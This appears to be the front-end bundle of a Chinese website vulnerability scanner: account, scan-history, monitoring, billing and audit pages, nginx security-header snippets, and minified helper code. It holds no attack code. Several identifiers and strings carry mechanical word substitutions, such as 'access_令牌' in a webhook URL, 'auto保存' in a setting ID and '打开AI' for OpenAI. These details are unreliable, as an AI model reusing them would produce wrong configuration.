        <div class="auth-form-row">

          <input type="text" id="reg-username" placeholder="用户名" aria-label="用户名" />

        </div>

        <div class="auth-form-row">

          <input type="text" id="reg-email" placeholder="邮箱（可选）" aria-label="邮箱" />

        </div>

        <div class="auth-form-row">

          <input type="password" id="reg-password" placeholder="密码" aria-label="密码" />

        </div>

        <div class="auth-form-row">

          <input type="password" id="reg-password2" placeholder="确认密码" aria-label="确认密码" />

        </div>

        <div class="auth-form-row">

          <div id="auth-challenge-question-reg" class="auth-form-hint" style="margin-bottom:8px">验证码加载中...</div>
          <input type="hidden" id="auth-challenge-token-reg" />
          <input type="text" id="reg-challenge-answer" placeholder="验证码答案" aria-label="验证码答案" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="refreshAuthChallenge()">刷新验证码</button>

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="doResendVerification()">重新发送验证邮件</button>

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn" style="flex:1" onclick="doRegister()">注 册</button>

        </div>

        <div class="auth-form-row">

          <input type="text" id="verify-email-token" placeholder="邮箱验证令牌（收到邮件后填写）" aria-label="邮箱验证 令牌" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="doVerifyEmailFromToken()">验证邮箱</button>

        </div>

        <div class="auth-form-switch">

          已有账号？<a onclick="toggleAuthForm('login')">去登录</a>

        </div>

      </div>

    </div>



    <!-- 已登录：显示用户信息 -->

    <div id="auth-logged" style="display:none">

      <div class="settings-user-row">

        <div>

          <div class="user-name" id="auth-display-name">用户</div>

          <div class="user-label" id="auth-user-role">已登录</div>

          <div class="user-credits" id="user-credits" style="font-size:12px;color:var(--warning);margin-top:4px">额度：--</div>

        </div>

        <button class="auth-logout-btn" onclick="doLogout()">退出登录</button>

      </div>

    </div>

  </div>



  <!-- 账号统计 -->

  <div class="settings-group">

    <div class="settings-row-static">

      <div style="text-align:center;flex:1">

        <div class="num" id="stat-scan-count" style="color:var(--primary);font-size:18px;font-weight:700">0</div>

        <div style="font-size:11px;color:var(--text-secondary);margin-top:2px">扫描次数</div>

      </div>

      <div style="text-align:center;flex:1;border-left:1px solid var(--border-light);border-right:1px solid var(--border-light)">

        <div class="num" id="stat-avg-score" style="color:var(--success);font-size:18px;font-weight:700">-</div>

        <div style="font-size:11px;color:var(--text-secondary);margin-top:2px">平均评分</div>

      </div>

      <div style="text-align:center;flex:1">

        <div class="num" id="stat-fixed-count" style="color:var(--warning);font-size:18px;font-weight:700">0</div>

        <div style="font-size:11px;color:var(--text-secondary);margin-top:2px">已修复</div>

      </div>

    </div>

  </div>



  <!-- 设置菜单 -->

  <div class="settings-group">

    <div class="settings-row" onclick="showProfileTab('history')">

      <span>扫描历史</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('knowledge')">

      <span>安全知识库</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('monitor')">

      <span>监控目标</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('alerts')">

      <span>告警历史</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('credits')">

      <span>额度与使用记录</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="navigateTo('assets')">

      <span>资产管理</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="navigateTo('billing')">

      <span>购买积分套餐</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('settings')">

      <span>扫描设置</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('notifications')">

      <span>通知设置</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('ai-config')">

      <span>安全顾问配置</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('about')">

      <span>关于</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

  </div>



  <!-- 接口令牌 -->

  <div class="settings-group">

    <div class="settings-group-title">接口令牌</div>

    <div class="settings-row-static">

      <input type="text" id="api-令牌-input" readonly value="登录后显示 令牌" style="flex:1;background:#2b2b2b;color:var(--text-secondary);font-family:monospace;font-size:11px" />

      <button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px" onclick="copyApiToken()">复制</button>

    </div>

    <p style="font-size:11px;color:var(--text-secondary);margin-top:6px">此 令牌 用于 API 调用身份认证，登录后自动生成。令牌 会在服务端密钥变更或过期后失效。</p>

  </div>



  <!-- 扫描历史面板 -->

  <div id="profile-tab-history" class="profile-tab" style="display:none">

    <div class="card">

      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">

        <div class="card-title">扫描历史</div>

        <button class="fixer-btn secondary" style="height:36px;padding:0 14px;font-size:12px" onclick="clearScanHistory()">清空历史</button>

      </div>

      <!-- 风险趋势 -->

      <div id="history-trend-wrap" style="margin-bottom:16px;display:none">

        <div style="font-size:13px;font-weight:600;margin-bottom:8px">最近 5 次风险趋势</div>

        <div id="history-trend-chart" style="height:60px"></div>

      </div>

      <!-- 对比模式工具栏 -->

      <div id="history-compare-bar" style="display:none;align-items:center;gap:8px;margin-bottom:12px;padding:10px;background:var(--bg);border-radius:2px;border:1px solid var(--border)">

        <span style="font-size:12px;color:var(--text-secondary)">已选择 <strong id="history-compare-count">0</strong> 项</span>

        <button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px;margin-left:auto" onclick="cancelHistoryCompare()">取消</button>

        <button class="fixer-btn primary" style="height:32px;padding:0 12px;font-size:12px" id="history-compare-btn" onclick="doHistoryCompare()" disabled>对比</button>

      </div>

      <div id="scan-history-list"></div>

      <div id="history-pagination" class="pagination-bar" style="display:none"></div>

    </div>

  </div>



  <!-- 安全知识库面板 -->

  <div id="profile-tab-knowledge" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">安全响应头速查</div>

      <div class="finding-section" style="margin-top:10px">

        <h4>Strict-Transport-Security (HSTS)</h4>

        <p>强制浏览器使用 HTTPS，防止 SSL 剥离攻击。</p>

        <div class="code-block" style="margin-top:6px">add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;</div>

      </div>

      <div class="finding-section">

        <h4>Content-Security-Policy (CSP)</h4>

        <p>限制页面可加载的资源来源，防止 XSS 攻击。</p>

        <div class="code-block" style="margin-top:6px">add_header Content-Security-Policy "default-src 'self'; script-src 'self'; frame-ancestors 'none'" always;</div>

      </div>

      <div class="finding-section">

        <h4>X-Frame-Options</h4>

        <p>防止网站被嵌入到恶意 iframe 中（点击劫持）。</p>

        <div class="code-block" style="margin-top:6px">add_header X-Frame-Options "DENY" always;</div>

      </div>

      <div class="finding-section">

        <h4>X-Content-Type-Options</h4>

        <p>禁止浏览器进行 MIME 类型嗅探。</p>

        <div class="code-block" style="margin-top:6px">add_header X-Content-Type-Options "nosniff" always;</div>

      </div>

    </div>

  </div>



  <!-- 监控目标面板 -->

  <div id="profile-tab-monitor" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">监控目标管理</div>

      <p class="card-desc" style="margin-bottom:14px">添加需要定期扫描的网站 URL，系统将按设定频率自动扫描。</p>

      <div class="monitor-add-row">

        <input type="url" id="monitor-url-input" placeholder="输入网址，例如 https://示例.com" />

        <select id="monitor-freq-select">

          <option value="daily">每天</option>

          <option value="weekly">每周</option>

          <option value="none">不扫描</option>

        </select>

        <button class="monitor-add-btn" onclick="addMonitorTarget()"> 添加</button>

      </div>

      <div id="monitor-target-list"></div>

    </div>

  </div>



  <!-- 告警历史面板 -->

  <div id="profile-tab-alerts" class="profile-tab" style="display:none">

    <div class="card">

      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">

        <div class="card-title">告警历史</div>

        <button class="fixer-btn secondary" style="height:36px;padding:0 14px;font-size:12px" onclick="markAllAlertsRead()">全部已读</button>

      </div>

      <div id="alerts-list" style="min-height:60px"></div>

      <div id="alerts-pagination" class="pagination-bar" style="display:none"></div>

    </div>

  </div>



  <!-- 设置面板 -->

  <div id="profile-tab-settings" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">扫描设置</div>

      <div class="settings-row" style="margin-top:10px" onclick="toggleSetting(this, 'auto保存')">

        <span>自动保存扫描结果</span>

        <span class="settings-toggle on" id="setting-auto保存" data-enabled="true"></span>

      </div>

      <div class="settings-row" onclick="toggleSetting(this, 'darkMode')">

        <span>深色模式</span>

        <span class="settings-toggle" id="setting-darkMode" data-enabled="false"></span>

      </div>

      <div class="settings-row" onclick="toggleSetting(this, 'notify')">

        <span>扫描完成提醒</span>

        <span class="settings-toggle on" id="setting-notify" data-enabled="true"></span>

      </div>

    </div>

  </div>



  <!-- 通知设置面板 -->

  <div id="profile-tab-notifications" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">通知设置</div>

      <p class="card-desc" style="margin-bottom:14px">配置告警通知方式，支持邮件和 Webhook（钉钉/企业微信/飞书）。</p>

      <div style="margin-bottom:12px">

        <label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">通知邮箱</label>

        <input type="email" id="notify-email-input" placeholder="name@example.com" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

      </div>

      <div style="margin-bottom:12px">

        <label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">Webhook 地址</label>

        <input type="url" id="notify-webhook-input" placeholder="https://oapi.dingtalk.com/robot/send?access_令牌=你的令牌" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

        <p style="font-size:12px;color:var(--text-secondary);margin-top:4px">支持钉钉、企业微信、飞书等 Markdown Webhook</p>

      </div>

      <div style="margin-bottom:16px">

        <label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">告警阈值</label>

        <select id="notify-threshold-select" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)">

          <option value="critical">仅严重 (Critical)</option>

          <option value="high">高危及以上 (High+)</option>

          <option value="medium">中危及以上 (Medium+)</option>

          <option value="low">低危及以上 (Low+)</option>

          <option value="all">全部通知</option>

        </select>

      </div>

      <button class="fixer-btn primary" style="width:100%" onclick="saveNotificationSettings()">保存设置</button>

    </div>

  </div>



  <!-- 额度与使用记录面板 -->

  <div id="profile-tab-credits" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">额度与使用记录</div>

      <div style="display:flex;align-items:center;gap:12px;margin:14px 0;padding:14px;background:var(--bg);border:1px solid var(--border);border-radius:2px">

        <div>

          <div style="font-size:12px;color:var(--text-secondary)">当前额度</div>

          <div id="credits-balance" style="font-size:24px;font-weight:700;color:var(--warning)">--</div>

        </div>

        <button class="fixer-btn secondary" style="margin-left:auto;height:32px;padding:0 14px;font-size:12px" onclick="loadCreditsUsage()">刷新</button>

      </div>

      <div id="credits-usage-list" style="min-height:60px">

        <div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取使用记录...</div>

      </div>

      <div id="credits-pagination" class="pagination-bar" style="display:none"></div>

    </div>

  </div>



  <!-- 安全顾问配置面板 -->

  <div id="profile-tab-ai-config" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">安全顾问配置</div>

      <div style="margin-top:14px">

        <label style="display:block;font-size:13px;color:var(--text-secondary);margin-bottom:6px">接口密钥</label>

        <div style="display:flex;gap:8px">

          <input id="ai-config-apikey" type="password" placeholder="sk-你的密钥" style="flex:1;padding:10px 12px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

          <button onclick="toggleApiKeyVisibility()" id="ai-config-eye" style="background:var(--bg-secondary);border:1px solid var(--border);border-radius:2px;padding:0 12px;cursor:pointer;font-size:13px;color:var(--text-secondary)">显示</button>

        </div>

        <div style="font-size:11px;color:var(--text-lighter);margin-top:4px">接口密钥 仅保存在浏览器本地，不会上传到服务器。</div>

      </div>

      <div style="margin-top:14px">

        <label style="display:block;font-size:13px;color:var(--text-secondary);margin-bottom:6px">模型提供商</label>

        <select id="ai-config-provider" style="width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)">

          <option value="openai">打开AI (GPT-4)</option>

        </select>

      </div>

      <div style="margin-top:14px">

        <label style="display:block;font-size:13px;color:var(--text-secondary);margin-bottom:6px">模型名称</label>

        <input id="ai-config-model" type="text" placeholder="例如：gpt-4o-mini" style="width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

      </div>

      <div class="settings-row" style="margin-top:14px" onclick="toggleAISetting('useLLM')">

        <span>启用 LLM（优先调用真实大模型）</span>

        <span class="settings-toggle on" id="setting-useLLM" data-enabled="true"></span>

      </div>

      <div style="margin-top:14px;display:flex;gap:8px">

        <button onclick="saveAIConfig()" style="flex:1;background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:10px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:500">保存配置</button>

        <button onclick="clearAIConfig()" style="flex:1;background:var(--bg);color:var(--text);border:1px solid var(--border);padding:10px;border-radius:2px;cursor:pointer;font-size:13px">清除配置</button>

      </div>

    </div>

  </div>



  <!-- 关于面板 -->

  <div id="profile-tab-about" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">关于</div>

      <div style="text-align:left;font-size:13px;color:var(--text-secondary);line-height:2">

        <p>基于 OWASP Top 10 安全标准</p>

        <p>域名归属验证，确保授权扫描与敏感目标拦截</p>

        <p>智能检查，生成多平台修复配置</p>

        <p>账号级数据隔离</p>

        <p>支持 Nginx、Apache、Node.js</p>

      </div>

      <div style="margin-top:16px;padding-top:16px;border-top:1px solid var(--border-light)">

        <p style="font-size:12px;color:var(--text-lighter)">开源项目 | MIT License</p>

        <p style="font-size:12px;color:var(--text-lighter);margin-top:4px">反馈：vuln-sentinel@example.com</p>

      </div>

    </div>

  </div>

</div>



<!-- 计费套餐页面 -->

<div class="page" id="page-billing">

  <div class="workbench-header">

    <h1 class="workbench-title">服务套餐</h1>

    <span class="workbench-subtitle">购买积分套餐，按量使用扫描与修复服务</span>

  </div>



  <div class="card" style="margin-bottom:16px">

    <div class="card-title">选择套餐</div>

    <p class="card-desc" style="margin-bottom:14px">额度用于体检、复测、修复验证、报告导出和审计留痕，购买后即时到账。</p>

    <div id="billing-plans-list" style="min-height:80px">

      <div style="text-align:center;padding:20px;color:var(--text-secondary)">正在加载服务套餐...</div>

    </div>

  </div>



  <div class="card">

    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">

      <div class="card-title">服务记录</div>

      <button class="fixer-btn secondary" style="height:32px;padding:0 14px;font-size:12px" onclick="loadBillingPage()">刷新</button>

    </div>

    <div id="billing-records-list" style="min-height:60px">

      <div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取充值记录...</div>

    </div>

    <div id="billing-records-pagination" class="pagination-bar" style="display:none"></div>

  </div>

</div>



<div class="page" id="page-audit">

  <div class="workbench-header">

    <h1 class="workbench-title">源码与上线审计</h1>

    <span class="workbench-subtitle">用于检查网站是否存在源码泄露、源码映射暴露、目录索引、敏感文件与上线前基础风险</span>

  </div>



  <div class="card" style="margin-bottom:16px">

    <div class="card-title">审计说明</div>

    <p class="card-desc" style="margin-bottom:14px">这里不是本地仓库的静态代码审计，而是针对目标网站的源码泄露与上线前安全审计。输入网址后，系统会复用现有扫描能力，重点筛查 source map、目录索引、敏感文件、HTML 注释、调试信息、配置暴露与高风险外链，并输出可交付的审计结论。</p>

    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px">

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>1. 源码泄露</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">检查 .map、source map、HTML 注释、目录索引、调试输出等风险。</div></div>

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>2. 上线检查</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">检查常见安全响应头、敏感路径、登录态与重定向风险。</div></div>

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>3. 结果输出</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">输出命中项、证据片段、置信度与可直接交付的结论。</div></div>

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>4. 复测建议</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">给出修复方向、复测建议与二次核验重点。</div></div>

    </div>

  </div>



  <div class="card" style="margin-bottom:16px">

    <div class="card-title">执行审计</div>

    <div style="display:grid;gap:12px;margin-top:12px">

      <div>

        <label for="audit-url" style="display:block;margin-bottom:6px;font-size:13px;font-weight:600">目标网址</label>

        <input id="audit-url" type="url" placeholder="输入网站地址，例如 https://example.com" style="width:100%;padding:12px 14px;border:1px solid var(--border);border-radius:2px;font-size:14px;background:var(--bg);color:var(--text)" />

      </div>

      <label class="scan-checkbox" style="margin:0">

        <input id="audit-auth-check" type="checkbox" onchange="document.getElementById('audit-run-btn').disabled=!this.checked" />

        <span>我已确认拥有上述网址或已获得授权扫描，且不属于政府等受限目标</span>

      </label>

      <div style="display:flex;flex-wrap:wrap;gap:10px;align-items:center">

        <button id="audit-run-btn" class="btn btn-primary" onclick="runAuditWorkbench()" disabled>开始审计</button>

        <button class="btn btn-secondary" onclick="fillAuditTargetFromScan()">使用当前扫描网址</button>

        <button class="btn btn-secondary" onclick="downloadAuditReport()">导出审计 PDF</button>

      </div>

      <div id="audit-status" style="font-size:13px;color:var(--text-secondary)">请输入网址后开始审计。</div>

    </div>

  </div>



  <div class="card">

    <div class="card-title">审计结果</div>

    <div id="audit-result" style="margin-top:12px;min-height:120px">

      <div style="text-align:center;padding:24px 16px;color:var(--text-secondary)">审计结果会显示在这里。</div>

    </div>

  </div>

</div>



<!-- Batch Scan Modal -->

<div class="modal" id="batch-scan-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:1000;align-items:center;justify-content:center">

  <div class="modal-content" style="background:var(--card);border:1px solid var(--border);border-radius:2px;padding:20px;max-width:520px;width:92vw;max-height:85vh;overflow-y:auto">

    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">

      <h3 style="margin:0;font-size:16px">批量体检</h3>

      <button onclick="closeBatchScanModal()" aria-label="关闭批量体检" style="background:none;border:none;font-size:20px;cursor:pointer;color:var(--text-secondary)">×</button>

    </div>

    <div style="font-size:12px;color:var(--text-secondary);margin-bottom:8px">每行一个 URL，最多 5 个。建议先用快速模式体检公开测试站点：</div>

    <textarea id="batch-urls" placeholder="https://示例.com&#10;https://测试站点.com&#10;https://样例.org" style="width:100%;min-height:120px;padding:10px;border:1px solid var(--border);border-radius:2px;font-family:monospace;font-size:12px;background:var(--bg);color:var(--text);resize:vertical"></textarea>

    <div style="margin:10px 0;display:flex;align-items:center;gap:6px;font-size:12px">

      <input type="checkbox" id="batch-deep" style="cursor:pointer" />

      <label for="batch-deep" style="cursor:pointer;color:var(--text-secondary)">深度扫描（含 XSS/SQLi 注入测试）</label>

    </div>

    <label class="scan-checkbox" style="margin-bottom:10px">

      <input id="batch-auth-check" type="checkbox" onchange="document.getElementById('batch-go-btn').disabled=!this.checked" />

      <span>我已确认拥有上述域名或已获得授权扫描，且不属于政府等受限目标</span>

    </label>

    <div id="batch-results" style="margin-top:12px"></div>

    <div style="display:flex;gap:8px;margin-top:14px">

      <button onclick="closeBatchScanModal()" style="flex:1;background:var(--bg);color:var(--text);border:1px solid var(--border);padding:10px;border-radius:2px;cursor:pointer">关闭</button>

      <button onclick="doBatchScan()" id="batch-go-btn" disabled style="flex:1;background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:10px;border-radius:2px;cursor:pointer;font-weight:500">开始批量体检</button>

    </div>

  </div>

</div>



<nav class="bottom-nav">

  <button class="nav-item active" data-page="home" onclick="navigateTo('home')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>

    <span>首页</span>

  </button>

  <button class="nav-item" data-page="scan" onclick="navigateTo('scan')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>

    <span>扫描</span>

  </button>

  <button class="nav-item" data-page="fixer" onclick="navigateTo('fixer')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>

    <span>修复器</span>

  </button>

  <button class="nav-item" data-page="tickets" onclick="navigateTo('tickets')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg>

    <span>工单</span>

  </button>

  <button class="nav-item" data-page="billing" onclick="navigateTo('billing')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>

    <span>计费</span>

  </button>

  <button class="nav-item" data-page="audit" onclick="navigateTo('audit')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l7 4v6c0 5-3.8 9.7-7 10-3.2-.3-7-5-7-10V6l7-4z"/><path d="M9 12l2 2 4-4"/></svg>

    <span>审计</span>

  </button>

  <button class="nav-item" data-page="profile" onclick="navigateTo('profile')">

    <div style="position:relative">

      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>

      <span id="nav-alert-badge" style="display:none;position:absolute;top:-4px;right:-6px;background:var(--danger);color:#fff;font-size:10px;font-weight:700;padding:1px 5px;border-radius:2px;min-width:16px;text-align:center">0</span>

    </div>

    <span>我的</span>

  </button>

</nav>



<!-- 右上角主题切换按钮 -->

<button class="theme-fab" id="theme-fab" onclick="toggleThemeQuick()" aria-label="切换明暗主题" title="切换主题">

  <svg id="theme-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:20px;height:20px">

    <circle cx="12" cy="12" r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/>

  </svg>

</button>

`;function Qe(e){return document.getElementById(e)||null}function st(e,i){let t=Qe(e);t&&(t.textContent=i)}function Ui(e,i){let t=Qe(e);t&&(t.innerHTML=i)}function Ne(e,i){let t=Qe(e);t&&(t.style.display=i)}function E(e){if(e==null)return"";let i=document.createElement("div");return i.appendChild(document.createTextNode(String(e))),i.innerHTML}function be(e){return String(e??"").replace(/'/g,"&#39;").replace(/"/g,"&quot;")}function et(e){try{return/^https?:\/\//i.test(e)||(e="http://"+e),new URL(e).hostname}catch{return e.replace(/^https?:\/\//i,"").split("/")[0]}}function jt(e){return e=parseInt(e,10),isNaN(e)&&(e=0),e>=75?"#73c990":e>=50?"#f0a732":"#c75450"}function Pt(e){return e=parseInt(e,10),isNaN(e)&&(e=0),e=Math.max(0,Math.min(100,e)),e>=75?"conic-gradient(#73c990 0% "+e+"%, #334155 "+e+"% 100%)":e>=50?"conic-gradient(#f0a732 0% "+e+"%, #334155 "+e+"% 100%)":"conic-gradient(#c75450 0% "+e+"%, #334155 "+e+"% 100%)"}function qi(e){return e==="严重"||e==="critical"||e==="高风险"||e==="high"?"high":e==="中风险"||e==="medium"?"medium":"low"}function yt(e){return navigator.clipboard&&navigator.clipboard.writeText?navigator.clipboard.writeText(e):new Promise((i,t)=>{try{let s=document.createElement("textarea");s.value=e,s.style.position="fixed",s.style.left="-9999px",document.body.appendChild(s),s.select(),document.execCommand("copy"),document.body.removeChild(s),i()}catch(s){t(s)}})}function Wt(e){if(!e)return"-";try{const i=new Date(e);if(isNaN(i.getTime()))return e;const t=s=>String(s).padStart(2,"0");return`${i.getFullYear()}-${t(i.getMonth()+1)}-${t(i.getDate())} ${t(i.getHours())}:${t(i.getMinutes())}`}catch{return e}}function De(e){if(!e)return"未知错误";let i="";return typeof e.error=="string"&&e.error?i=e.error:typeof e.detail=="string"&&e.detail?i=e.detail:Array.isArray(e.detail)&&e.detail.length>0?i=e.detail.map(function(t){return t?typeof t=="string"?t:typeof t.msg=="string"&&t.msg?t.msg:Array.isArray(t.loc)&&t.loc.length?String(t.loc[t.loc.length-1]):"":""}).filter(Boolean).join("；"):typeof e.message=="string"&&e.message?i=e.message:i="请求失败",typeof e.code=="string"&&!i.includes(e.code)&&e.code!=="ERROR"&&(i+="（"+e.code+"）"),e.restricted_code==="restricted"?i+="（该目标类型受限，请确认您拥有合法授权后再扫描）":e.restricted_code==="ownership_required"?i+="，请先完成域名归属验证。":e.restricted_code==="unauthorized"&&(i+="（请先确认您有权扫描该目标）"),i}function Zt(e){return e&&e._status===402&&e.code==="PAYMENT_REQUIRED"}function Ht(e){return Zt(e)?typeof e.message=="string"&&e.message||"额度不足，请充值后再试":""}function mt(e){let i=e&&(e.message||e.error||e.detail)||String(e)||"未知错误";return/timeout|timed out/i.test(i)?"请求超时，请检查网络连接或稍后重试":/network|fetch|internet|offline/i.test(i)?"网络连接异常，请检查网络设置":/403|forbidden/i.test(i)?"请求被拒绝，请检查权限或联系管理员":/404|not found/i.test(i)?"请求的资源不存在":/500|502|503|504|server error/i.test(i)?"服务器暂时不可用，请稍后重试":/unauthorized|401|未登录|登录|token|jwt/i.test(i)?"登录状态已过期，请重新登录":i}function pe(e,i){let t=Qe(e);t&&(i?(t._originalText=t.textContent,t.textContent="处理中...",t.disabled=!0):(t.textContent=t._originalText||t.textContent,t.disabled=!1))}function pi(e,i,t,s){let r=Qe(e);if(!r)return;if(t<=1){r.innerHTML="";return}let o="",a=5,n=Math.max(1,i-Math.floor(a/2)),c=Math.min(t,n+a-1);c-n<a-1&&(n=Math.max(1,c-a+1)),i>1&&(o+='<button class="page-btn" data-page="'+(i-1)+'">上一页</button>');for(let p=n;p<=c;p++)o+='<button class="page-btn '+(p===i?"active":"")+'" data-page="'+p+'">'+p+"</button>";i<t&&(o+='<button class="page-btn" data-page="'+(i+1)+'">下一页</button>'),r.innerHTML=o,r.querySelectorAll(".page-btn").forEach(function(p){p.addEventListener("click",function(){let v=parseInt(this.dataset.page,10);s&&s(v)})})}var Zn={header:"相关响应头",detected:"检测结果",reason:"判断依据",impact:"影响说明",value:"当前值",check_scope:"检测范围",limitation:"检测局限",param:"问题参数",payload:"测试 Payload",url:"问题 URL",path:"暴露路径",status:"响应状态",snippet:"内容片段",library:"组件名称",version:"当前版本",detected_version:"当前版本",min_safe_version:"安全版本",cve:"关联 CVE",missing_flags:"缺失安全标志",redirect_to:"重定向目标",os:"操作系统",body_hint:"响应特征",days_left:"证书剩余天数",method:"检测方法"},Xn=["detected","header","reason","impact","value","check_scope","limitation","param","payload","url","path","status","snippet","library","version","detected_version","min_safe_version","cve","missing_flags","redirect_to","os","body_hint","days_left","method"];function ri(e){if(!e||typeof e!="object")return"";let i=Object.keys(e).filter(function(r){return e[r]!==void 0&&e[r]!==null&&e[r]!==""});if(i.length===0)return"";let t=[];return Xn.forEach(function(r){i.indexOf(r)>=0&&t.push(r)}),i.forEach(function(r){t.indexOf(r)<0&&t.push(r)}),'<div style="margin-top:10px">'+t.map(function(r){let o=Zn[r]||r,a=e[r],n="";if(r==="detected"){let c=a?"#c75450":"#73c990",p=a?"已检测到":"未检测到";n='<span style="color:'+c+';font-weight:600;font-size:12px">'+p+"</span>"}else if(r==="payload")n='<code style="background:#3b0d0d;color:#fecaca;padding:2px 8px;border-radius:2px;font-size:12px;word-break:break-all;border:1px solid rgba(199,84,80,0.35)">'+E(a)+"</code>";else if(r==="url"||r==="path")n='<code style="background:#2b2b2b;padding:2px 8px;border-radius:2px;font-size:12px;word-break:break-all">'+E(a)+"</code>";else if(r==="cve"){let c=String(a),p=c.match(/CVE-\d{4}-\d{4,7}/gi)||[];if(p.length>0){n=p.map(function(d){return'<span style="display:inline-block;background:#c75450;color:#fff;padding:2px 8px;border-radius:2px;font-size:11px;font-weight:700;letter-spacing:0.3px">'+E(d)+"</span>"}).join(" ");let v=c.replace(/CVE-\d{4}-\d{4,7}/gi,"").replace(/[,\s、，；;]+/g," ").trim();v&&(n+=' <span style="font-size:12px;color:var(--text-secondary)">'+E(v)+"</span>")}else n='<span style="display:inline-block;background:#c75450;color:#fff;padding:2px 